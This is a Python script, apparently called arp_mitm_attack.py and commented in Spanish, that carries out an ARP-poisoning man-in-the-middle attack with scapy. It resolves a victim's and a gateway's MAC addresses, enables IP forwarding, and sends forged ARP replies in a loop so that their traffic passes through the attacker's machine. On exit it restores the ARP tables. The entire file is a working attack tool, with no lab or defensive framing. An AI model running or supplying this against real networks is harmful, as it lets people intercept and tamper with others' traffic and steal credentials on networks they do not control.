import argparse, signal, sys, time, os
from scapy.all import Ether, ARP, sendp, srp, conf, get_if_hwaddr

stats = {"sent": 0, "start": None}

def get_mac(ip, iface):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), iface=iface, timeout=2, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    print(f"[!] No se pudo obtener MAC de {ip}")
    sys.exit(1)

def enable_ip_forward():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[*] IP Forwarding habilitado")

def disable_ip_forward():
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] IP Forwarding deshabilitado")

def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, iface):
    print("\n[*] Restaurando ARP tables...")
    for _ in range(5):
        sendp(Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), iface=iface, verbose=False)
        sendp(Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), iface=iface, verbose=False)
        time.sleep(0.5)
    print("[*] ARP tables restauradas OK")

def print_stats():
    elapsed = time.time() - stats["start"] if stats["start"] else 0
    print(f"\nPaquetes ARP falsos enviados: {stats['sent']} | Tiempo: {elapsed:.2f}s")

def signal_handler(sig, frame):
    print_stats()
    sys.exit(0)

def arp_poison(target_ip, gateway_ip, iface, interval):
    attacker_mac = get_if_hwaddr(iface)
    print(f"[*] Obteniendo MACs...")
    target_mac  = get_mac(target_ip, iface)
    gateway_mac = get_mac(gateway_ip, iface)
    print(f"[*] Victima  : {target_ip} => {target_mac}")
    print(f"[*] Gateway  : {gateway_ip} => {gateway_mac}")
    print(f"[*] Atacante : {attacker_mac}")
    print("[*] Iniciando envenenamiento ARP... Ctrl+C para detener.\n")
    enable_ip_forward()
    stats["start"] = time.time()
    pkt_to_target  = Ether(dst=target_mac)  / ARP(op=2, pdst=target_ip,  hwdst=target_mac,  psrc=gateway_ip, hwsrc=attacker_mac)
    pkt_to_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip,  hwsrc=attacker_mac)
    try:
        while True:
            sendp(pkt_to_target,  iface=iface, verbose=False)
            sendp(pkt_to_gateway, iface=iface, verbose=False)
            stats["sent"] += 2
            elapsed = time.time() - stats["start"]
            print(f"\r  [*] ARP falsos enviados: {stats['sent']} | {elapsed:.0f}s", end="", flush=True)
            time.sleep(interval)
    except KeyboardInterrupt:
        restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, iface)
        disable_ip_forward()
        print_stats()
        sys.exit(0)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Requiere root: sudo python3 arp_mitm_attack.py")
        sys.exit(1)
    conf.verb = 0
    signal.signal(signal.SIGINT, signal_handler)
    p = argparse.ArgumentParser()
    p.add_argument("-i", "--interface", required=True)
    p.add_argument("-t", "--target",    required=True)
    p.add_argument("-g", "--gateway",   required=True)
    p.add_argument("-d", "--delay",     type=float, default=2.0)
    args = p.parse_args()
    arp_poison(args.target, args.gateway, args.interface, args.delay)
